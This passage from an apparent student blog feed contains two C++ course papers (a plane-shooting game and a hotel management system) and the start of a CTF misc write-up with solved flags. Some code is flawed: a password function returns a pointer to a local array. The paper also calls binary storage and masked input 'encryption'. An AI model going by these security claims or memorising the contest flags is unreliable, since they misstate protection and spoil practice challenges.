&#x3D;&#x3D; 0)&#123;    MOUSEMSG m;    while (MouseHit())    &#123;        m &#x3D; GetMouseMsg();        if(m.uMsg &#x3D;&#x3D; WM_MOUSEMOVE)        &#123;            position_x &#x3D; m.x;            position_y &#x3D; m.y;        &#125;        else if (m.uMsg &#x3D;&#x3D; WM_LBUTTONDOWN)        &#123;            bullet_x &#x3D; position_x;            bullet_y &#x3D; position_y - 85;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的使用键盘操作代码为：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char input;if (_kbhit())  &#x2F;&#x2F; 判断是否有输入&#123;    input &#x3D; _getch();  &#x2F;&#x2F; 根据用户的不同输入来移动，不必输入回车    if (input &#x3D;&#x3D; 27) &#x2F;&#x2F; ESC键的ACSII码为27        gameStatus &#x3D; 3;    if (input &#x3D;&#x3D; &#39;a&#39;)        position_x -&#x3D; 10;    if (input &#x3D;&#x3D; &#39;d&#39;)        position_x +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;w&#39;)        position_y +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;s&#39;)        position_y -&#x3D; 10;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先定义MOUSEMSG的鼠标类型参数m;通过while (MouseHit()) 进行操作，既能保证能够使用鼠标进行操作也避免了，在没有鼠标操作时游戏的停止。</p><p>类似的有定义char 类型的的变量通过while(_kbhit())来进行是否有键盘信息的判断，用_getch()函数获取键盘的敲击值。</p><h5 id="4-3-与用户输出无关的逻辑">4.3 与用户输出无关的逻辑</h5><p>4.3.1 敌机生成逻辑</p><p>使用rand()函数生成一个最大为32767的数，并通过%(Width-50)得到飞机的初始坐标，并同时将blood等参数复原。</p><p>4.3.2 敌机简单移动逻辑<br>代码如下:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (enemy_y &lt; High - 25)&#123;    if (enemy_x &#x3D;&#x3D; 0)        flag &#x3D; 0;    if (enemy_x &#x3D;&#x3D; 500)        flag &#x3D; 1;    enemy_y &#x3D; enemy_y + 1;    if (flag &#x3D;&#x3D; 1)        enemy_x &#x3D; enemy_x--;    else enemy_x &#x3D; enemy_x++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块通过定义全局变量static flag 进行操控飞机的飞行方向，同时在每个循环过程中使飞机能够实现摆动下降。</p><h5 id="4-4暂停页面与存储逻辑">4.4暂停页面与存储逻辑</h5><p>通过_getch()函数读取输入，如存在按键为Esc时，将gameStatus设置为3，出现暂停页面，图3为游戏暂停页面。<br>图3 游戏暂停页面<br>游戏数据储存逻辑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">void read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ifstream file2<span class="token punctuation">;</span><span class="token operator">//</span>输入指针    file2<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../data.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    file2 <span class="token operator">>></span> position_x <span class="token operator">>></span> position_y <span class="token operator">>></span> bullet_x <span class="token operator">>></span> enemy_x <span class="token operator">>></span> enemy_y <span class="token operator">>></span> isExpolde <span class="token operator">>></span> score<span class="token punctuation">;</span>    file2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>void write<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ofstream file1<span class="token punctuation">;</span>    file1<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./data.txt"</span><span class="token punctuation">,</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>ios<span class="token punctuation">:</span><span class="token punctuation">:</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>!file1<span class="token punctuation">.</span>is_open<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"打开文件失败！！\n"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    file1 <span class="token operator">&lt;&lt;</span> position_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> position_y <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> bullet_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_y <span class="token operator">&lt;&lt;</span><span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> isExpolde <span class="token operator">&lt;&lt;</span><span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> score <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ifstream和ofstream两个类进行操作，实现数据的存储于写入。也通过键盘操作识别Esc按钮实现暂停操作。</p><p>图4为飞机大战程序登录界面，图5为程序运行截图</p><img src=".\基于C++的可视化飞机大战游戏\程序登录界面.png" style="zoom:80%;" /><center>  图4 程序登录界面 </center><img src=".\基于C++的可视化飞机大战游戏\程序运行截图.png" style="zoom: 80%;" /><center> 图5 程序运行截图</center>#### 5.总结<p>基于C++的可视化飞机大战游戏是一个简单的可视化的小游戏，玩家能够通过鼠标或键盘进行操控飞机的移动和攻击，并且运用了文件操作技术，可以实现数据的永久性保存。基于C++的飞机大战游戏是采用C++语言及其easyX拓展模块开发完成的。本项目实现了游戏流程中的所有功能，界面布局更加人性化,并有着良好的可扩展性。但游戏依旧存在一些不足之处，比如说本游戏还没有实现对玩家操纵飞机进行血量的显示，敌方飞机尚无法发射子弹，对击中逻辑的判断还存在问题。</p><h4 id="参考文献：">参考文献：</h4><p>[1]黄宝贵等.C++面向对象程序设计[M] 北京:清华大学出版社，2019:2-3<br>[2]童晶编著.C语言程序设计与游戏开发实践教程[M] 北京:清华大学出版社 2017:16<br>[3]黄维通等.Visual C++面向对象与可视化程序设计[M]（第三版）北京:清华大学出版社 2011:14<br>[4]郑莉等编著.C++程序设计语言(第三版)[M].北京:清华大学出版社,2005:134-139.<br>[5]刘振安等编著.C++程序设计课程设计[M] 北京:机械工业出版社,2004:23-31  [6]朱立华等编著.面向对象程设计及C++[M].北京:人民邮电出版社,2008:43  [7]郑莉,董渊.C++语言程序设计(第二版) [M].北京清华大学出版社,2002:23  [8]陈维兴,林小茶.C++面向对象程序设计教程(第2版)[M].北京清华大学出版社.2007:34</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于C++的酒店管理系统的设计与实现</title>
      <link href="/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E9%85%92%E5%BA%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E9%85%92%E5%BA%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基于c-的酒店管理系统的设计与实现">基于C++的酒店管理系统的设计与实现</h2><p><strong>摘要</strong>：在如今这个快速发展的新时代，碎片化和多元化的管理方式层出不穷，人们消费水平的提高导致酒店、餐饮等服务行业管理的需求大大增加。而酒店作为服务行业的龙头，首当其冲地受到了影响，而人工管理往往存在各种各样的纰漏，本项目正好是解决了这个问题。该项目是基于C++程序设计语言开发而成的一个酒店管理系统，其具有酒店管理员登录、录入客人入住信息、查询客人入住情况、修改客房信息等功能。该系统可以帮助酒店管理者高效地查询、修改酒店信息，减轻了酒店管理者的工作负担，提高管理者的工作效率。</p><p><strong>关键词</strong>：酒店管理系统 信息管理 高效 C++程序设计语言</p><h3 id="引言">引言</h3><p>随着21世纪互联网行业的迅速发展，如今已经进入了一个信息大爆炸的时代，人们的生活已经离不开电子信息科技。传统的人工管理服务已经跟不上电子智能管理的步伐了，在酒店服务行业也应当有此创新，因此，本文设计开发一个酒店管理系统。</p><h3 id="1-技术介绍">1  技术介绍</h3><h4 id="1-1开发语言">1.1开发语言</h4><p>C++程序设计语言是在C语言基础上开发的一门面向对象的编程语言，它兼容C语言，具有灵活高效、可移植性好等优点，此外，C++支持类、封装、继承、多态等特性，并包括含标准模板库（STL）与多种设计模式。</p><h4 id="1-2开发技术">1.2开发技术</h4><p>此系统主要运用到了链表、指针、类、函数以及文件等方法技术。在实现注册、注册功能的时候使用了函数、指针及链表遍历等技术来实现管理员的注册和登录安全，注册登录方面实现对密码的加密。该系统使用类和文件不断读写实现对客人信息的储存、修改和重复使用。</p><h4 id="1-3开发工具">1.3开发工具</h4><p>系统开发采用Dev-C++工具。Dev-C++ 使用MingW64/TDM-GCC编译器，遵循C++ 11标准，同时兼容C++98标准。开发环境包括多页面窗口、工程编辑器以及调试器等，在工程编辑器中集合了编辑器、编译器、连接程序和执行程序，提供高亮度语法显示的，以减少编辑错误，还有完善的调试功能，适合初学者与编程高手的不同需求，是学习C或C++的首选开发工具。</p><h3 id="2-需求分析">2 需求分析</h3><h4 id="2-1项目概述">2.1项目概述</h4><p>本项目主要目标是帮助酒店管理者更高效、有序地管理酒店信息而开发的一个酒店服务管理项目。首先管理员需要注册一个管理员账号，然后可以使用管理员账号登陆管理员控制界面；然后管理员可以添加酒店里所有顾客的住房信息，比如入住时间、入住期限、入住押金、房间号等；管理员输入完信息后可以查询输入信息是否有误并且可以进行实时修改；同时，管理员还可以浏览所有住房信息、所有客人信息，进行筛选客房等。</p><h4 id="2-2主要功能分析">2.2主要功能分析</h4><p>系统的主要功能如下:</p><ol><li>管理员注册：管理员账号注册，管理员输入用户名、密码、确认密码来进行注册操作。如果两次输入不一致，系统会提示两次密码不一致，并且询问是否重新注册，是则回到注册界面，反之，返回欢迎界面。若注册的账号再一次被管理员注册，系统会报错，并提示“用户名存在，请重新注册”，并询问是否继续，若是则回到注册界面，反之，回到欢迎界面</li><li>管理员登录：管理员注册完信息后可进行登陆操作，输入自己注册成功的账号、密码信息，等待一会儿，会自动跳转到管理系统界面。</li><li>客人入住信息录入：管理员在管理系统界面里选择客人信息入住选项，可以进行多个客人住房信息的录入。该操作使用文件保存多个客人的住房信息</li><li>显示楼层客房信息：管理员可以通过这个功能查看各个楼层的已被客人选中的房间，然后知道哪些楼层有空房，及时告知要入住酒店的客人。</li><li>查询客人入住情况：对所有客人入住信息的查询功能，前台客人问询时或者有已入住客人查询自己的信息时，管理员可及时回答并告知。</li><li>修改房间押金：管理员可随时对客人入住的押金金额进行修改。</li><li>修改客人信息：当有管理员录入信息时输入错误时可及时对错误的客人信息进行修改操作。或者客人信息告知错误也可及时进行修改。</li><li>统计收入：酒店实时统计客人住房所用费用。</li><li>退出程序：使用完程序后安全退出。</li></ol><h4 id="2-3基本流程分析">2.3基本流程分析</h4><p>系统的功能包括客人信息录入、查询与修改信息等。具体功能流程如图2-1所示：</p><img src="D:\blog\shierjinghuang\source\_posts\基于C++的酒店管理系统的设计与实现\系统流程图.png" style="zoom:80%;" /><center>图2-1系统流程图</center>### 3 系统设计<h4 id="3-1类的设计">3.1类的设计</h4><p>系统采用类的设计，根据类创建出具体的对象并投入使用。就比如在此系统中就创建了Customer顾客类，在Customer顾客类中定义成员函数，实现运算符的重载，使程序面向对象。本系统运用类提供了模型化、信息隐藏和可重用性的好处。具体代码如下：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Customer &#123;    friend ostream &amp;operator&lt;&lt;(ostream &amp;os,Customer &amp;cu);    private:    Menu myMenu;    string name;    &#x2F;&#x2F;客人姓名    int date;      &#x2F;&#x2F;入住时间int day;      &#x2F;&#x2F;入住期限int money;     &#x2F;&#x2F;入住押金int everydaymoney; &#x2F;&#x2F;每日租金Room room;  &#x2F;&#x2F;客房信息    public:    Customer();    Customer(string na, int dat, int da, int mo, int emon, int idn, int deg, int ty, int fl, int nu);string getname() &#123;           return name;       &#125;    void setname(string na) &#123;        name&#x3D;na;    &#125;    int getdate() &#123;        return date;    &#125;    void setdate(int dat) &#123;        date&#x3D;dat;    &#125;    int getday() &#123;        return day;    &#125;    void setday(int da) &#123;        day&#x3D;da;    &#125;    int getmoney() &#123;        return money;    &#125;    void setmoney(int mon) &#123;        money&#x3D;mon;    &#125;    int geteverydaymoney() &#123;        return everydaymoney;    &#125;    void seteverdaymoney(int emon)&#123;        everydaymoney&#x3D;emon;    &#125;    Room setroom()&#123;        return room;    &#125;    void getroom(Room ro) &#123;        room&#x3D;ro;    &#125;    void run();    void input();    &#x2F;&#x2F;创建表单    int readIn();    &#x2F;&#x2F;文件读入    void alter();    &#x2F;&#x2F;修改信息    void findByfloor(); &#x2F;&#x2F;按楼层查找    void changemoney(); &#x2F;&#x2F;修改押金    void show();     &#x2F;&#x2F;显示客户入住情况    void print();    &#x2F;&#x2F;统计并显示收入    void rank();     &#x2F;&#x2F;客房类型入住量排 &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2文件存储设计">3.2文件存储设计</h4><p>本系统采用了文件存储设计，实现了信息的动态存储，使此系统可以实现对存储信息的修改和查看。本系统采用二进制文本使客人入住信息保存到本地硬盘customer.dat文件中。其在系统界面可以对客人入住信息进行查询和修改，但在本地硬盘本中只显示一堆乱码，这一设计大大增强系统的保密性，保护客人的资料信息不易被窥视。文件保存具体内容如图3-1所示：</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E9%85%92%E5%BA%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2%E4%B8%BA%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF%E7%95%8C%E9%9D%A2.png" alt=""></p><center>图3-1 二进制保存文件转换为文本文件格式错误界面</center>**应保存的内容信息如图3-2所示：**<p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E9%85%92%E5%BA%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E7%9A%84%E7%9C%9F%E5%AE%9E%E4%BF%A1%E6%81%AF%E7%95%8C%E9%9D%A2.jpg" alt=""></p><center>图3-2 二进制文本文件保存的真实信息界面</center><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;具体代码如下：ofstream os(&quot;customer.txt&quot;,ios_base::out|ios_base::binary);&#x2F;&#x2F;创建、打开文件for(n&#x3D;0; n&lt;room.number; n++) &#123;    os.write( reinterpret_cast&lt;char*&gt;(&amp;(customer[n])),sizeof(Customer) );  &#x2F;&#x2F;导出文件&#125;os.close();  &#x2F;&#x2F;关闭文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-3-链表设计">3.3 链表设计</h4><p>本系统在用户注册功能上使用链表设计，遍历链表寻找已注册的账号，实现重复注册账号时系统报错的功能。并且在管理员登录时遍历链表查找已注册的账号信息，使系统只允许已注册的账号登陆，增强了管理员账号的安全性。系统运行后将文件中的所有客人信息读取到链表中，具体代码如下：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;从文件中读取用户信息，返回一个表头地址pUser readUserFile() &#123;    FILE *fp;    &#x2F;&#x2F;文件指针    int n&#x3D;0;&#x2F;&#x2F;记录链表 的结点数    pUser head&#x3D;NULL;&#x2F;&#x2F;定义头指针    pUser p2,p,pre;    fp&#x3D;fopen(&quot;User.txt&quot;,&quot;a+&quot;);    &#x2F;&#x2F;以只读的方式打开文件    if(fp&#x3D;&#x3D;NULL) &#123;        cout&lt;&lt;&quot;cannot open file\n&quot;;    &#125;     else &#123;        while(!feof(fp)) &#123;            &#x2F;&#x2F;判断文件位置标志是否移动到文件末尾            n++;            p&#x3D;(pUser)malloc(sizeof(struct User)); &#x2F;&#x2F;向内存申请一段空间            fread(p,sizeof(struct User),1,fp); &#x2F;&#x2F;将fp所指向的文件中的内容赋给p            if(n&#x3D;&#x3D;1) &#123;                head&#x3D;p;                p2&#x3D;p;            &#125;            else &#123;                &#x2F;&#x2F;创建链表                pre&#x3D;p2;                p2-&gt;next&#x3D;p;                p2&#x3D;p;            &#125;        &#125;        p2-&gt;next&#x3D;NULL;    &#125;    if(n&lt;&#x3D;2)        head-&gt;next&#x3D;NULL;    else        pre-&gt;next&#x3D;NULL;    fclose(fp);   &#x2F;&#x2F;关闭文件    return head;  &#x2F;&#x2F;返回头指针&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-系统实现">4 系统实现</h3><h4 id="4-1密码加密功能的实现">4.1密码加密功能的实现</h4><p>本系统在管理员输入密码使采用密码加密的方式输入密码，管理员注册、登录的安全性得以保障。此功能的实现如图4-1，4-2所示：</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E9%85%92%E5%BA%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5C%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E7%95%8C%E9%9D%A2.png" alt=""></p> <center>图4-1 管理员注册界面</center>![](D:\blog\shierjinghuang\source\_posts\基于C++的酒店管理系统的设计与实现\管理员登录界面.png) <center>图4-2 管理员登录界面</center>具体代码如下：<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;隐藏密码char *HidePassword() &#123;    har password[18];&#x2F;&#x2F;密码    char *p;&#x2F;&#x2F;指向密码的指针    int i&#x3D;0;&#x2F;&#x2F;记录密码位数    char t;&#x2F;&#x2F;输入密码    for(;;) &#123;        &#x2F;&#x2F;此处为输入密码不回显操作        t&#x3D;getch();    &#x2F;&#x2F;输入k        if(t&#x3D;&#x3D;&#39;\r&#39;) &#123;            &#x2F;&#x2F;如果输入k为回车，则跳出循环            break;        &#125;else if(t&#x3D;&#x3D;&#39;\b&#39;) &#123;            &#x2F;&#x2F;如果输入k为删除键            if(i&gt;0) &#123;                   &#x2F;&#x2F;如若密码还没完全删除                cout&lt;&lt;&quot;\b&quot;;                cout&lt;&lt;&quot; &quot;;                cout&lt;&lt;&quot;\b&quot;;                i--;            &#125;        &#125; else &#123;            &#x2F;&#x2F;如果输入的k既不是删除键，也不是回车键            password[i]&#x3D;t;  &#x2F;&#x2F;把k的值赋给_password[i];            cout&lt;&lt;&quot;*&quot;;            &#x2F;&#x2F;输出*号，保护用户隐私            i++;            &#x2F;&#x2F;密码位数加1        &#125;    &#125;    password[i]&#x3D;&#39;\0&#39;;&#x2F;&#x2F;在数组末端加一个结束符    p&#x3D;password;&#x2F;&#x2F;让p指向该数组    return p; &#x2F;&#x2F;返回一个指向密码的指针&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2客人入住信息录入功能实现">4.2客人入住信息录入功能实现</h4><p>本系统使用文件存储的方式来实现对客人入住信息的动态存储，本系统接下来的一系列查询、修改信息围绕此功能展开。此功能的实现如图4-3所示：</p><img src="D:\blog\shierjinghuang\source\_posts\基于C++的酒店管理系统的设计与实现\客人入住信息录入功能界面.jpg" style="zoom:50%;" /><center>图4-3 客人入住信息录入功能界面</center>具体代码如下：<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Status ruzhu()&#123;    &#x2F;&#x2F;入住操作     findprice();    printf(&quot;请输入需要预定的房间编号：\n&quot;);    parton keren;    if(scanf(&quot;%d&quot;, &amp;keren.guenum)!&#x3D;1)&#123;        printf(&quot;输入错误！\n已退出！\n&quot;);        exit(0);    &#125;    int i;    i&#x3D;HashIndex(keren.guenum);    &#x2F;&#x2F;哈希地址     if(!hash[i].guenum)&#123;        printf(&quot;查无此房!!\n&quot;);        return;    &#125;    if(hash[i].shifouruzhu)&#123;        printf(&quot;此房间已经有人!\n&quot;);        return;    &#125;    int n;    printf(&quot;请输入几人入住：\n&quot;);    if(scanf(&quot;%d&quot;, &amp;n)!&#x3D;1)&#123;        printf(&quot;输入错误！\n已退出！\n&quot;);        return;    &#125;    if(hash[i].maxnum&lt;n)&#123;        &#x2F;&#x2F;超过入住人数上限        printf(&quot;超过人数上限！！\n请重新输入：\n&quot;);        return;    &#125;    printf(&quot;请输入客人姓名：\n&quot;);    scanf(&quot;%s&quot;, keren.name);    printf(&quot;请输入客人身份证号：\n&quot;);    scanf(&quot;%s&quot;, keren.idnum);    printf(&quot;请输入客人电话号码：\n&quot;);    scanf(&quot;%s&quot;, keren.phone);    printf(&quot;请输入客人性别：\n&quot;);    scanf(&quot;%s&quot;, keren.sex);    printf(&quot;请输入入住时间：（年月日），中间用空格隔开\n&quot;);    scanf(&quot;%d%d%d&quot;, &amp;keren.time.year,&amp;keren.time.mon,&amp;keren.time.day);    printf(&quot;请输入入住时长：\n&quot;);    scanf(&quot;%d&quot;, &amp;keren.timelong);    time_t rawtime;&#x2F;&#x2F;获取时间标记     keren.s&#x3D;time(&amp;rawtime);    hash1[i]&#x3D;keren;&#x2F;&#x2F;入住     hash[i].shifouruzhu&#x3D;1;    &#x2F;&#x2F;客房信息改为有人入住     hash[i].num&#x3D;n;    &#x2F;&#x2F;入住人数     writetotxt();    &#x2F;&#x2F;写入修改后的客人和客房信息     write1totxt(); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-修改客房信息功能实现">4.3 修改客房信息功能实现</h4><p>本系统可实现对客房信息的修改。此功能的实现如图4-4所示 ：</p><img src="D:\blog\shierjinghuang\source\_posts\基于C++的酒店管理系统的设计与实现\修改客房信息功能界面.jpg" style="zoom:50%;" /><center>图4-4 修改客房信息功能界面</center> 修改完信息后返回酒店管理系统界面后浏览所有住房信息，所有住房信息被更新，完成修改。修改后的住房信息如图4-5所示：<img src="D:\blog\shierjinghuang\source\_posts\基于C++的酒店管理系统的设计与实现\浏览所有住房信息功能界面.jpg" style="zoom: 80%;" /> <center>图4-5 浏览所有住房信息功能界面</center>### 5 总结 <p>本项目基本实现了酒店管理员对酒店的管理，本项目的优势在于对客人入住信息的搜集比较完整，甚至细化到对其中个别信息，比如租金等的修改。还有此系统对于用户的信息的安全性也有足够的保障，管理员能够初步对酒店进行一个信息管理。</p><p>但是本系统也存在着一些不足之处，可在以下方面进行改进完善：</p><ol><li>可增加前台用户端，实现双端操作，客人注册账号输入信息后管理员后台自动保存客人住房信息，完全代替人工手动输入，使信息透明化，双端都可通过此系统查看信息。但前台用户端没有修改信息的权限，保证管理员对酒店信息的控制权限。</li><li>计费功能的完善：计费功能方面可以加入按时计费功能，让此系统更加准确地实时计费。</li><li>退房功能：直接在前台用户端加入退房功能，实现用户入住信息的实时更新。</li></ol><h3 id="参考文献：">参考文献：</h3><p>[1] 曹晶.C++语言课程设计的实践[J].机械职业教育，2001，2(1): 12-13.</p><p>[2] 刘腾红,孙细明.信息系统分析与设计[M].北京：科学出版社，2003，2(2): 13-15.</p><p>[3] 谭浩强.C++程序设计[M].北京：清华大学出版社，2004，4(2): 22-27.</p><p>[4] 李云清,杨庆红.数据结构[M].北京：人民邮电大学出版社,2004，4(1): 22-29.</p><p>[5] 夏秀清.咸阳海泉温泉酒店市场营销方案设计与实施[D].西安：西北大学,2008，3(2): 18-21.</p><p>[6] 传智播客高教产品研发部.C语言程序设计教程[M].北京：人民邮电出版社，中国工信出版集团，2015，2(1):13-16.</p><p>[7] 王宇博.计算机C++语言编程技巧问题与解决办法[J].计算机产品与流通，2019，2(1): 12-15.</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QFNUCTF春季练习赛结题记录</title>
      <link href="/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h4 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1 二维码"></a>1 二维码</h4><p>题目下载出的压缩包中是一张二维码<br>这张二维码，用手机扫一扫后输出secret in here .试了一下这东西不是flag，使用Formost分解图片找到了一个压缩包，里面的txt文件名字叫做4.number。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-cc97408e49939ec3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>使用软件进行爆破，得到密码7639，得到flag：CTF{vjpw_wnoei}</p><h4 id="2-基础破解"><a href="#2-基础破解" class="headerlink" title="2  基础破解"></a>2  基础破解</h4><p>给你一个压缩包，你并不能获得什么，因为他是四位数字加密的，嗯题干说的很清晰，密码是四位数字加密的，同样暴力跑下，得到结果2563，输入打开密码文件，得道，</p><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>很明显这是base64编码,使用工具解码得flag{70354300a5100ba78068805661b93a5c}，换成相应格式就可以提交了。</p><h3 id="3-大白-●—●"><a href="#3-大白-●—●" class="headerlink" title="3 大白(●—●)"></a>3 大白(●—●)</h3><p>大白这道题真是一道老题，使用winhex修改图片高度就可以得到flag，但是在之前我的winhex被我玩坏了，重下外带激活，忙活了老一阵。</p><p>####4 多种方法解决<br>从平台下载下来到文件是exe类型，但是无法正常打开，修改拓展名为txt，发现文件头是：</p><blockquote><p>data:image/jpg;base64,</p></blockquote><p>这个是将jpg文件转化成的base64编码，使用工具<a href="http://tool.chinaz.com/tools/imgtobase">base64图片在线转换工具</a>将base64编码专为图片，扫描图片得到flag，KEY{dca57f966e4e4e31fd5b15417da63269}</p><h4 id="5-爱因斯坦"><a href="#5-爱因斯坦" class="headerlink" title="5 